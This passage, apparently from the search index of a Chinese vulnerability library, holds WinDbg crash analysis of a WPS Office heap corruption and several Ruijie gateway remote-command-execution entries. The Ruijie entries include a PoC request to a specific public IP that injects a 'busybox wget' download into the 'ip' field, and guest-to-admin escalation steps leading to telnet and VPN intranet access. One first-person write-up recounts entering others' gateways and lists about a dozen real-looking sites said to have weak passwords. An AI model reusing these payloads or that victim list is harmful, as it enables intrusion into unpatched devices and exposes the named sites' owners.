???????? ????????  ???????????????? cf69b01c  ???????? ???????? ???????? ????????  ???????????????? cf69b02c  ???????? ???????? ???????? ????????  ????????????????</p> <p>0:000&gt; dc c88baf80 c88baf80  00000001 0000001c 00000010 00000001  ................ c88baf90  ff000000 ff800000 ff008000 ff808000  ................ c88bafa0  ff000080 ff800080 ff008080 ff808080  ................ c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................ c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................ c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................ c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................ c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................  <code>\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee3\u7801\u5b9e\u9645\u4e0a\u6ca1\u6709\u4ece\u6307\u9488\u91ca\u653e\u4efb\u4f55\u4e1c\u897f\u3002\u4e00\u65e6\u79fb\u81f3EDX\uff0cEDX\u5c06\u4fdd\u7559\u6307\u5411\u7d22\u5f15\u6570\u7ec4\u7684\u6307\u9488\uff1a</code> eax=00000000 ebx=00791878 ecx=00000005 edx=cf69afbc esi=cb07de18 edi=0000001c eip=6ba3cb8f esp=00791780 ebp=00791870 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b: 6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch] ss:002b:00791864=d1326100</p> <p>0:000&gt; dc cf69afbc cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2......... cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8. cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@.... cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l.... cf69affc  c0c0c0c0 ???????? ???????? ????????  ....???????????? cf69b00c  ???????? ???????? ???????? ????????  ???????????????? cf69b01c  ???????? ???????? ???????? ????????  ???????????????? cf69b02c  ???????? ???????? ???????? ????????  ????????????????</p> <p>0:000&gt; dc c88baf80 c88baf80  00000001 0000001c 00000010 00000001  ................ c88baf90  ff000000 ff800000 ff008000 ff808000  ................ c88bafa0  ff000080 ff800080 ff008080 ff808080  ................ c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................ c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................ c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................ c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................ c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................  <code>\u5d29\u6e83\u540e\u7684\u5806\u6808\u8ddf\u8e2a\uff1a</code> 0:000&gt; kvL  # ChildEBP RetAddr  Args to Child             00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8 01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234 03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e 04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b 05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8 06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98 08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325 09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a 0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23  <code>\u5806\u5206\u6790\uff1a</code> 0:000&gt; !heap -p -a cc53afbc     address cc53afbc found in     _DPH_HEAP_ROOT @ 6731000     in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                 cc36323c:         cc53afa8               58 -         cc53a000             2000     6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240     77a9909b ntdll!RtlDebugAllocateHeap+0x00000039     779ebbad ntdll!RtlpAllocateHeap+0x000000ed     779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f     779eae8e ntdll!RtlAllocateHeap+0x0000003e     6f080269 MSVCR100!malloc+0x0000004b     6f08233b MSVCR100!operator new+0x0000001f     6b726c67 QtCore4!QImageData::create+0x000000fa     6b726b54 QtCore4!QImage::QImage+0x0000004e     6b7a0e21 QtCore4!png_get_text+0x00000436     6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de     6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf     6b725eb4 QtCore4!QImageReader::read+0x000001e2     6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e     6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator=+0x00000693     6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146     6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5     6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a     6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d     6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083     6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6     6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090     6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c     6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060     6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5     6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1     6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046     6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a     680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1     6d0e36df kso!AbstractVisual::visualEvent+0x00000051     6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f     6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e</p> <p>0:000&gt; dt _DPH_BLOCK_INFORMATION cc780e18-0x20 verifier!_DPH_BLOCK_INFORMATION    +0x000 StartStamp       : 0xc0c0c0c0    +0x004 Heap             : 0xc0c0c0c0 Void    +0x008 RequestedSize    : 0xc0c0c0c0    +0x00c ActualSize       : 0xc0c0c0c0    +0x010 Internal         : _DPH_BLOCK_INTERNAL_INFORMATION    +0x018 StackTrace       : 0xc0c0c0c0 Void    +0x01c EndStamp         : 0xc0c0c0c0  <code>\u6bb5\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5806\u6761\u76ee\u901a\u5e38\u662f\u4e00\u4e2a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u7684\u72b6\u6001\u6307\u793a\u4e3a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u58f0\u660e\u524d\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u4e3a00108\uff0c\u800c\u5f53\u524d\u5757\u7684\u5927\u5c0f\u4e3a00a30\u3002\u524d\u4e00\u5757\u62a5\u544a\u5176\u81ea\u8eab\u5927\u5c0f\u4e3a0x20\u5b57\u8282\uff0c\u4e0d\u5339\u914d\u3002\u4f4d\u7f6e\u4e3a05f61000\u7684\u5806\u5757\u7684\u4f7f\u7528\u4f3c\u4e4e\u662f\u8be5\u5806\u5757\u7684\u4f7f\u7528\u5bfc\u81f4\u4ee5\u4e0b\u5757\u7684\u5143\u6570\u636e\u635f\u574f\u7684\u53ef\u80fd\u6027\u3002\u5806\u5757\uff1a</code> 0:000&gt; !heap -a 05f60000  Index   Address  Name      Debugging options enabled   1:   05f60000      Segment at 05f60000 to 0605f000 (00001000 bytes committed)     Flags:                00000002     ForceFlags:           00000000     Granularity:          8 bytes     Segment Reserve:      00100000     Segment Commit:       00002000     DeCommit Block Thres: 00000200     DeCommit Total Thres: 00002000     Total Free Size:      00000146     Max. Allocation Size: fffdefff     Lock Variable at:     05f60258     Next TagIndex:        0000     Maximum TagIndex:     0000     Tag Entries:          00000000     PsuedoTag Entries:    00000000     Virtual Alloc List:   05f6009c     Uncommitted ranges:   05f6008c             05f61000: 000fe000  (1040384 bytes)     FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8         05f605b0: 00108 . 00a30 [100] - free</p> <pre><code>Segment00 at 05f60000:\n    Flags:           00000000\n    Base:            05f60000\n    First Entry:     05f604a8\n    Last Entry:      0605f000\n    Total Pages:     000000ff\n    Total UnCommit:  000000fe\n    Largest UnCommit:00000000\n    UnCommitted Ranges: (1)\n\nHeap entries for Segment00 in Heap 05f60000\n     address: psize . size  flags   state (requested size)\n    05f60000: 00000 . 004a8 [101] - busy (4a7)\n    05f604a8: 004a8 . 00108 [101] - busy (107) Internal \n    05f605b0: 00108 . 00a30 [100]\n    05f60fe0: 00a30 . 00020 [111] - busy (1d)\n    05f61000:      000fe000      - uncommitted bytes.\n</code></pre> <p>0:000&gt; dd 05f60fe0 05f60fe0  a9b3c836 03007087 05f6008c 05f6008c 05f60ff0  05f60038 05f60038 05f61000 000fe000 05f61000  ???????? ???????? ???????? ???????? 05f61010  ???????? ???????? ???????? ???????? 05f61020  ???????? ???????? ???????? ???????? 05f61030  ???????? ???????? ???????? ???????? 05f61040  ???????? ???????? ???????? ???????? 05f61050  ???????? ???????? ???????? ????????  ```</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_3","title":"\u62ab\u9732\u65f6\u95f4\u8868","text":"<p>\u8be5\u6f0f\u6d1e\u4e8e2020\u5e748\u6708\u62a5\u544a\u3002\u62ab\u9732\u65f6\u95f4\u8868\uff1a 2020-08-04-\u5c06\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u5230\u516c\u5f00\u63d0\u4f9b\u7684WPS\u7684\u5404\u79cd\u90ae\u4ef6\u5217\u8868\uff08\u9500\u552e\u548c\u652f\u6301\uff09\u3002 2020-08-10-WPS\u56e2\u961f\u56de\u5e94\u8be5\u62a5\u544a\u53ef\u4ee5\u8f6c\u53d1\u7ed9\u4ed6\u4eec\u3002 2020-08-11-\u8981\u6c42\u8fdb\u4e00\u6b65\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u54a8\u8be2\u548c\u5411\u9002\u5f53\u7684\u6e20\u9053\u62ab\u9732\u7b49\u3002 2020-08-17-\u6839\u636e\u5148\u524d\u7684\u8981\u6c42\u4e0eWPS\u56e2\u961f\u8fdb\u884c\u8ddf\u8fdb\u3002 2020-08-18-WPS\u56e2\u961f\u505a\u51fa\u56de\u5e94\uff0c\u4ed6\u4eec\u4f1a\u7167\u987e\u597d\u5b83\uff0c\u5e76\u8f6c\u4ea4\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-18-\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u63d0\u4f9b\u6280\u672f\u62a5\u544a\u548c\u6982\u5ff5\u9a8c\u8bc1\uff08\u672a\u52a0\u5bc6\uff09\u3002 2020-08-25-WPS\u8ddf\u8fdb\u62a5\u544a\u8fdb\u5ea6\u3002 2020-08-26-WPS\u66f4\u65b0\u8bf4\u6b64\u95ee\u9898\u5df2\u8f6c\u53d1\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-28-WPS\u53d1\u9001\u4e86\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u6307\u51fa\u8be5\u95ee\u9898\u5df2\u5728\u6700\u65b0\u7684\u4e0b\u8f7d\u7248\u672c11.2.0.9403\u4e2d\u5f97\u5230\u89e3\u51b3\u3002 2020-08-28-\u9488\u5bf9\u63d0\u4f9b\u7684PoC\u6d4b\u8bd5\u4e86\u65b0\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u95ee\u9898\u5df2\u89e3\u51b3\u3002 2020-08-28-\u5411WPS\u56e2\u961f\u5bfb\u6c42\u54a8\u8be2\u6216\u66f4\u6539\u65e5\u5fd7\u66f4\u65b0\u3002 2020-08-31-WPS\u56e2\u961f\u901a\u77e5\u4ed6\u4eec\u4e0d\u518d\u66f4\u65b0\u6216\u7ef4\u62a4\u4efb\u4f55\u5b89\u5168\u516c\u544a\u3002 2020-09-03-\u6f0f\u6d1e\u5199\u4fe1 \u8981\u6c42CVE\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"\u9510\u6377\u6613\u7f51\u5173 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"<p>\u6d4b\u8bd5\u56fa\u4ef6\u7248\u672c\u4e3a EG_RGOS11.9(4)B11P1_EG3200_install</p> <p>guest_auth \u4e2d\u7684 guestIsUp.php \u6587\u4ef6\u5b58\u5728\u95ee\u9898</p> <p>\u53ef\u4ee5\u660e\u663e\u770b\u51fa\u8fd9\u91cc\u53ef\u4ee5\u5b58\u5728\u62fc\u63a5\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u6548\u679c\u3002 </p> <p>\u6784\u9020\u76f8\u5e94\u7684 poc \u53ef\u8fbe\u5230\u547d\u4ee4\u6267\u884c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<pre><code>POST /guest_auth/guestIsUp.php HTTP/1.1\nHost: 120.35.11.141:9999\nConnection: keep-alive\nContent-Length: 45\nPragma: no-cache\nCache-Control: no-cache\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: http://120.35.11.141:9999\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nReferer: http://120.35.11.141:9999/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\nmac=1&amp;ip='busybox wget xxxxx:8888' \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"\u9510\u6377\u6613\u7f51\u5173guest\u8d8a\u6743\u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","title":"\u8be6\u7ec6\u8bf4\u660e\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","title":"\u6f0f\u6d1e\u8bc1\u660e\uff1a","text":"<p>1.\u767e\u5ea6\u641c\u7d22\uff1a\u201c\u8bf7\u8f93\u5165\u60a8\u7684RG-EG\u6613\u7f51\u5173\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u201d</p> <p></p> <p></p> <p></p> <p></p> <p>2\uff0c\u627e\u4e86\u4e00\u4e2a\u767b\u5f55\u6293\u5305</p> <p></p> <p></p> <p>\u53d1\u73b0\u53c2\u6570\u5f88\u6709\u610f\u601dcommand=\u6267\u884c\u7684\u547d\u4ee4strurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec config\u7b49mode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f3.\u4e8e\u662fshow run\u4e00\u4e0b</p> <p></p> <p>\u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u90a3\u6211\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\u5462\uff1f\u8bd5\u4e00\u4e0b</p> <p></p> <p>\u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u5982\u6b64\u8bf4\u6765\u6211\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u6240\u6709\u7684\u547d\u4ee4\u5566\uff0c\u4f46\u6ca1\u5fc5\u8981\u8fd9\u4e48\u9ebb\u70e6\u4e86\u3002\u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f</p> <p></p> <p>\u4e8e\u662f\u76f4\u63a5telnet\u8fdb\u6765\u4e86</p> <p></p> <p>\u7136\u540e\u561b\uff0c\u5c31\u662f\u914d\u7f6e\u4e00\u4e2avpn\uff0c\u76f4\u63a5\u5185\u7f51\u6f2b\u6e38\u4e86</p> <p></p> <p>\u597d\u5427\uff0c\u6211\u662f\u597d\u5b69\u5b50\uff0c\u914d\u7f6e\u5df2\u7ecf\u8fd8\u539f\u4e86\u8bd5\u4e86\u767e\u5ea6\u641c\u7d22\u51fa\u6765\u7684\u5341\u6765\u4e2a\u94fe\u63a5\uff0c\u53d1\u73b0\u5f31\u53e3\u4ee4\u90fd\u6709http://www.jincai.sh.cn:12315/index.htmhttp://jsgz.cn/http://xczp.qhrcsc.comhttp://lbszx.comhttp://www.zmjsjt.cnhttp://wcjy.zhjedu.cn/index.htmhttp://www.lflszx.comhttp://www.jyxqxx.com:88/index.htmhttp://www.lvtaotao.comhttp://oa.haotel.comhttp://www.tzcgps.cn/index.htm\u767e\u5ea6\u90a3\u4e48\u591a\u6ca1\u6562\u4e00\u4e2a\u4e00\u4e2a\u8bd5\u8bdd\u8bf4\u6211\u770b\u5230\u5176\u5b83\u6f0f\u6d1e\uff0c\u5382\u5546\u56de\u590d\u5df2\u7ecf\u505a\u4e86\u8865\u4e01\uff0c\u4f46\u8fd9\u4e9b\u8fd8\u5728\u53d7\u5bb3\u7684\u7528\u6237\uff0c\u660e\u663e\u4ed6\u4eec\u8fd8\u4e0d\u77e5\u9053\u8be5\u95ee\u9898\uff0c\u90a3\u8be5\u600e\u4e48\u529e\uff1f\u5bf9\u4e86\uff0c\u8bdd\u8bf4\u6700\u8fd1\u770b\u5230\u9510\u6377\u53d1\u4e86\u4e00\u4e2a\u65b0\u7f51\u5173\u4ea7\u54c1 eg350\uff0c\u770b\u94fe\u63a5\u597d\u50cfweb\u662f\u7528\u7684php\u7684\uff0c\u901a\u8fc7\u6316\u6398\u5df2\u7ecf\u53d1\u73b0\u90e8\u5206\u6f0f\u6d1e\uff0c\u7248\u672c\u53f7\uff08EG_RGOS 11.1(3)B1T3,  Release(02162111)\uff09\uff0c\u4f46\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u5382\u5546\u7684\u9057\u7559\u7248\u672c\uff0c\u5982\u679c\u4e0d\u662f\u8bf7\u544a\u77e5\uff0c\u6211\u4f1a\u8865\u51fa\u6765\uff0c\u5982\u679c\u662f\u90a3\u5c31\u5ffd\u7565\u5427\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","title":"\u4fee\u590d\u65b9\u6848\uff1a","text":"<p>\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"\u9510\u6377\u6613\u7f51\u5173\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","title":"\u6f0f\u6d1e\u8bf4\u660e","text":"<p>\u5728web\u7ba1\u7406\u9875\u9762\u4e0a\uff0c\u4f7f\u7528\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u8bbe\u5907\u540e\uff0c\u53ef\u901a\u8fc7web\u9875\u9762\u6267\u884c\u90e8\u5206\u64cd\u4f5c\u547d\u4ee4\uff0c\u8bbe\u5907\u4e0a\u6709\u63a5\u53e3\u6765\u8bfb\u53d6\u8fd9\u4e9b\u64cd\u4f5c\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u3002\u63a5\u53e3\u5bf9\u8fd4\u56de\u503c\u4e2d\u5b58\u5728\u7684\u6076\u610f\u6307\u4ee4\u8fc7\u6ee4\u4e0d\u5145\u5206\uff0c\u5bfc\u81f4\u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7CLI\u88ab\u8fdc\u7a0b\u6267\u884c\u4e00\u4e9b\u6076\u610f\u6307\u4ee4\uff0c\u5bf9\u8bbe\u5907\u6b63\u5e38\u8fd0\u884c\u9020\u6210\u5f71\u54cd\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u76ee\u524d\u4ec5\u7f51\u5173\u4ea7\u54c1\u768411x\u7248\u672c\u5b58\u5728\u6b64\u95ee\u9898\uff0c10.x\u7248\u672c\u672a\u53d1\u73b0\u6b64\u95ee\u9898\u3002 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>web\u9875\u9762\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u3001\u5bc6\u7801\u6cc4\u6f0f\uff0c\u4e14http\u767b\u5f55\u8bbf\u95ee\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u3002 \u8fdb\u5165\u9510\u6377\u6613\u7f51\u5173\u767b\u5f55\u754c\u9762\uff0c\u6293\u53d6\u4e00\u4e2a\u767b\u5f55\u6570\u636e\u5305\uff1a </p> <p>\u53d1\u73b0\u53c2\u6570\u4e2d\u6709command=\u6267\u884c\u7684\u547d\uff0cstrurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec\u548cconfig\u7b49\uff0cmode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f</p> <p>\u8f93\u5165 sh run\u547d\u4ee4\u8fdb\u884c\u5c1d\u8bd5\uff0c\u53ef\u67e5\u770b\u5230\u6709\u76f8\u5e94\u7684\u7528\u6237\u4fe1\u606f\uff1a  \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\uff0c\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u3002</p> <p>\u5c1d\u8bd5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\uff0c\u9700\u8981\u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u3002  \u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f\uff1a </p> <p>\u4e4b\u540e\u5c31\u53ef\u901a\u8fc7telnet\u8fdb\u5165\uff0c\u518d\u914d\u7f6e\u4e00\u4e2aVPN\u8d26\u53f7\u540e\u5c31\u53ef\u8fdb\u884c\u5185\u7f51\u6f2b\u6e38\uff1a </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","title":"\u7279\u5f81\uff1a","text":"<p>\u7248\u672c\uff1a\u9510\u6377\u6613\u7f51\u5173\u4ea7\u54c111x\u7248\u672c \u534f\u8bae\uff1ahttp\u534f\u8bae\uff0c\u9ed8\u8ba4\u7aef\u53e380 \u6d41\u91cf\u63a2\u6d4b\u53c2\u6570\u4e2d\u5305\u542b\uff1acommand=\u3001strurl=\u3001 exec\u3001 config\u3001mode=priv_exec \u6d41\u91cf\u63d0\u6743\u53c2\u6570\uff1awebmaster level 0 username guest password guest \u76f8\u5173\u8bbe\u5907\u547d\u4ee4\uff1ashow run\u3001sh run \u65b0\u589e\u5f02\u5e38VPN\u8d26\u53f7</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E%20/","title":"\u9510\u6377\u7f51\u7edc EWEB\u7f51\u7ba1\u7cfb\u7edfRCE\u6f0f\u6d1e","text":"<p>php</p> <pre><code>\u67e5\u8be2\u7528\u6237\u662f\u5426\u4e0a\u7ebf\u4e86\n$userip = @$_POST['ip'];\n$usermac = 